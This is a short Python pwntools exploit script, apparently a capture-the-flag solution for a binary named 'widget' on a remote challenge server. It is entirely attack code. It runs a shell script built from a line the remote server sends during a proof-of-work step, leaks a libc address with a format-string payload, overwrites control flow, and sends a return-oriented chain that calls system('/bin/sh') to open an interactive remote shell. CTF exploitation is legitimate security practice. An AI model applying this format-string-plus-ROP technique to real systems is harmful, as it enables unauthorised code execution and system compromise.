from pwn import *
import subprocess
import os

io = remote('challs.actf.co', 31320)
libc = ELF('./libc.so.6')
#io = process('./widget')

def pow():
    io.recvuntil(b'work: ')
    with open('run.sh', 'wb') as f:
        f.write(io.recvline())
    res = subprocess.run(['bash', './run.sh'], capture_output=True)
    io.sendlineafter(b'solution: ', res.stdout)


def pwn():
    io.sendlineafter(b'Amount: ', b'56')
    io.sendafter(b'Contents: ', b'%33$pAAA'+b'a'*0x18+p64(0x404808)+p64(0x4013fe))
    io.recvuntil(b'Your input: ')
    libc.address = int(io.recv(14), 16) - 128 - libc.sym['__libc_start_main']
    log.info(hex(libc.address))
    io.sendline(b'500')
    #gdb.attach(io)
    io.sendafter(b'Contents: ', b'AAAAAAAA'*5+p64(libc.address+0x2a3e5)+p64(next(libc.search(b'/bin/sh')))+p64(libc.sym['system']))



pow()
pwn()
io.interactive()
